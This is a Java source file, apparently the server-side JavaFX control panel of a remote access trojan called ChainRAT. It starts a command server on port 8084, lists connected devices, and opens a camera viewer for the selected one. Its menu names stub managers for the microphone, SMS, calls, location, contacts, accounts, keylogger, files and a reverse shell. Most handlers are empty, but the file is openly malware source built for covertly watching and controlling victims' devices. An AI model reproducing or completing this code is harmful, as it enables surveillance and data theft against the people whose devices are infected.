package com.nefi.chainrat.server.forms;

import com.nefi.chainrat.server.Main;
import com.nefi.chainrat.server.log.Log;
import com.nefi.chainrat.server.network.ControlServer.ChainControlServer;
import com.nefi.chainrat.server.network.ControlServer.Connection;
import com.nefi.chainrat.server.network.ControlServer.packets.CameraResponse;
import javafx.application.Platform;
import javafx.event.ActionEvent;
import javafx.fxml.FXMLLoader;
import javafx.fxml.Initializable;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.stage.Stage;

import java.io.IOException;
import java.net.URL;
import java.util.ResourceBundle;

public class frmMainController implements Initializable {
    public TextArea tbLogOut;
    public Label lbLog;
    public MenuItem btnClose;
    public MenuItem btnBuild;
    public MenuItem btnCamManager;
    public MenuItem btnMicManager;
    public MenuItem btnCallManager;
    public MenuItem btnFileManager;
    public MenuItem btnSMSManager;
    public MenuItem btnLocationManager;
    public MenuItem btnContactsManager;
    public MenuItem btnAccountManager;
    public MenuItem btnKeyloggerManager;
    public MenuItem btnApplicationsManager;
    public MenuItem btnReverseShellManager;
    public ListView listView;
    public Button btnTest;
    private Log log;

    private static frmMainController mainController;
    public static frmMainController getMainController(){
        return mainController;
    }
    private static frmCameraManager cameraManager;
    public static frmCameraManager getCameraManager(){
        return cameraManager;
    }

    @Override
    public void initialize(URL location, ResourceBundle resources) {
        log = Main.getLog();
        log.d(this, "Started MainForm :) on thread: " + Thread.currentThread().getName());

        //Start networking in seperate thread
        ChainControlServer server = new ChainControlServer(8084);
        Thread serverThread = new Thread(server);
        serverThread.start();
    }

    public void btnTest_Click(ActionEvent actionEvent) {
    }

    public void btnClose_Click(ActionEvent actionEvent) {
        Platform.exit();
        System.exit(0);
    }

    public void btnBuild_Click(ActionEvent actionEvent) {
    }

    public void btnCamManager_Click(ActionEvent actionEvent) throws IOException {

        String name = listView.getSelectionModel().getSelectedItem().toString();
        Connection out = ChainControlServer.getConnectionByName(name);

        FXMLLoader loader = new FXMLLoader();
        frmCameraManager controller = new frmCameraManager(out);
        loader.setController(controller);
        cameraManager = controller;
        loader.setLocation(getClass().getResource("frmCameraManager.fxml"));
        Parent root = loader.load();

        Stage stageCamManager = new Stage();
        stageCamManager.setTitle("CameraManager - " + name);
        stageCamManager.setScene(new Scene(root, 400, 800));
        stageCamManager.sizeToScene();
        stageCamManager.show();
    }

    public void btnMicManager_Click(ActionEvent actionEvent) {
    }

    public void btnSMSManager_Click(ActionEvent actionEvent) {
    }

    public void btnFileManager_Click(ActionEvent actionEvent) {
    }

    public void btnCallManager_Click(ActionEvent actionEvent) {
    }

    public void btnLocationManager_Click(ActionEvent actionEvent) {
    }

    public void btnContactsManager_Click(ActionEvent actionEvent) {
    }

    public void btnKeyloggerManager_Click(ActionEvent actionEvent) {
    }

    public void btnAccountManager_Click(ActionEvent actionEvent) {
    }

    public void btnReverseShellManager_Click(ActionEvent actionEvent) {
    }

    public void btnApplicationsManager_Click(ActionEvent actionEvent) {
    }

    public void updateList(){
        Platform.runLater(new Runnable() {
            @Override
            public void run() {
                listView.getItems().clear();
                for(Connection connection : ChainControlServer.clients){
                    listView.getItems().add(connection.name);
                }
            }
        });
    }
}
